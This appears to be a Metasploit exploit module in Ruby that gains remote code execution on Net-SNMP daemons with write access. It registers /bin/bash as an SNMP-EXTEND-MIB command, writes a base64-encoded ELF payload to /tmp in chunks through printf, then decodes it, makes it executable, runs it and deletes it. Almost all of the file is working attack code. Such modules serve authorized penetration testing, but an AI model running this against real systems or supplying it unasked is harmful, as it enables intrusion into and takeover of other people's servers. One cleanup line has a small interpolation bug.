##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'snmp'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::SNMPClient
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Net-SNMPd Write Access SNMP-EXTEND-MIB arbitrary code execution',
        'Description'    => %q(
            This exploit module exploits the SNMP write access configuration ability of SNMP-EXTEND-MIB to
 configure MIB extensions and lead to remote code execution.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => ['Steve Embling at InteliSecure'],
        'References'     =>
          [
            [ 'URL', 'https://www.intelisecure.com']
          ],
        'Payload'        =>
          {
            'Space'    => 4096 #arbitrary, but it seems to max out the size
            #'BadChars' => "\x00"
          },
        'Targets'        =>
        [
          ['Linux x86', { 'Arch' => ARCH_X86, 'Platform' => 'linux' }],
          #Not tested on other platforms but confirmed the above works.
        ],
        #'DisclosureDate' => "Dec 22 2017",
        'DefaultTarget'  => 0,
      )
    )
    register_options(
      [
        OptString.new('FILEPATH', [true, 'file path to write to ', '/tmp']),
        OptString.new('CHUNKSIZE', [true, 'Maximum bytes of payload to write at once ', 200])
      ])
  end

  def check
    Exploit::CheckCode::Unsupported
  end

  #
  # The exploit method connects and sets:
  # NET-SNMP-EXTEND-MIB::nsExtendStatus."tmp" = INTEGER: createAndGo(4)
  # NET-SNMP-EXTEND-MIB::nsExtendCommand."tmp" = STRING: /path/to/executable
  # NET-SNMP-EXTEND-MIB::nsExtendArgs."tmp" = STRING: arguments
  #
  def exploit
    @payload_name = "#{rand_text_alpha(5)}"
    full_path = datastore['FILEPATH'] + '/' + @payload_name
    payload_exe = Rex::Text.encode_base64(generate_payload_exe)
    if payload_exe.blank?
      fail_with(Failure::BadConfig, "Failed to generate the ELF, select a native payload")
    end
    print_status("Writing to NET-SNMP-EXTEND-MIB with given payload")
    comm     = datastore['COMMUNITY'].to_s
    # NET-SNMP-EXTEND-MIB::nsExtendStatus."tmp" = INTEGER: createAndGo(4)
    oid_1 = '1.3.6.1.4.1.8072.1.3.2.2.1.21.3.116.109.112'
    oid_1_value = 4
    oid_2 = '1.3.6.1.4.1.8072.1.3.2.2.1.2.3.116.109.112'
    oid_2_value = "/bin/bash"
    oid_3 = '1.3.6.1.4.1.8072.1.3.2.2.1.3.3.116.109.112'
    oid_4 = '1.3.6.1.4.1.8072.1.3.2.4.1.2.3.116.109.112.1'
    i = 0
    #vprint_status(payload_exe)
    chunk_size = datastore['CHUNKSIZE']
    chunk_size = chunk_size.to_i
    print_status("Payload generated. Sending in " + chunk_size.to_s + " byte chunk increments.")
    while i <= payload_exe.length
      ii = i + chunk_size
      if ii > payload_exe.length
        ii = -1
      end
      vprint_status(i.to_s + " " + ii.to_s)
      oid_3_value = "-c \"printf \'"+ payload_exe[i..ii]+"\' >> #{full_path}.1\""
      vprint_status(oid_3_value)
      SNMP::Manager.open(:Host => datastore['RHOST'], :Port => datastore['RPORT'], :Community => datastore['COMMUNITY']) do |manager|
          vprint_status(manager.get_value("sysDescr.0"))
          varbind1 = SNMP::VarBind.new(oid_1,SNMP::Integer.new(oid_1_value))
          varbind2 = SNMP::VarBind.new(oid_2,SNMP::OctetString.new(oid_2_value))
          varbind3 = SNMP::VarBind.new(oid_3,SNMP::OctetString.new(oid_3_value))
          resp = manager.set([varbind1, varbind2, varbind3])
          vprint_status(manager.get_value(oid_4).to_s)
      end
      #Hit same again, first rewrite  appears to remove the MIB, the next reinstates it.
      SNMP::Manager.open(:Host => datastore['RHOST'], :Port => datastore['RPORT'], :Community => datastore['COMMUNITY']) do |manager|
          varbind1 = SNMP::VarBind.new(oid_1,SNMP::Integer.new(oid_1_value))
          varbind2 = SNMP::VarBind.new(oid_2,SNMP::OctetString.new(oid_2_value))
          varbind3 = SNMP::VarBind.new(oid_3,SNMP::OctetString.new(oid_3_value))
          resp = manager.set([varbind1, varbind2, varbind3])
          vprint_status(manager.get_value(oid_4).to_s)
      end
      i = i + chunk_size + 1
    end
    print_status("Sent chunked executable. Now executing payload")
    #base64 may not be required here and might not be available on all platforms
    oid_3_value = "-c \"cat #{full_path}.1 | base64 -d > #{full_path}; chmod +x #{full_path};#{full_path};rm #{full_path};rm {full_path}.1\"" #
    vprint_status(oid_3_value)
    SNMP::Manager.open(:Host => datastore['RHOST'], :Port => datastore['RPORT'], :Community => datastore['COMMUNITY']) do |manager|
       varbind1 = SNMP::VarBind.new(oid_1,SNMP::Integer.new(oid_1_value))
       varbind2 = SNMP::VarBind.new(oid_2,SNMP::OctetString.new(oid_2_value))
       varbind3 = SNMP::VarBind.new(oid_3,SNMP::OctetString.new(oid_3_value))
       resp = manager.set([varbind1, varbind2, varbind3])
       begin
         status = manager.get_value(oid_4).to_s
         if status == "noSuchInstance"
           resp = manager.set([varbind1, varbind2, varbind3])
           status = manager.get_value(oid_4).to_s
           print_bad("SNMP is still responsive, this does not look good")
         end
         print_status(status)
       rescue SNMP::RequestTimeout
         print_good("SNMP request timeout (this is promising).")
       end
    end
    handler
  end
end
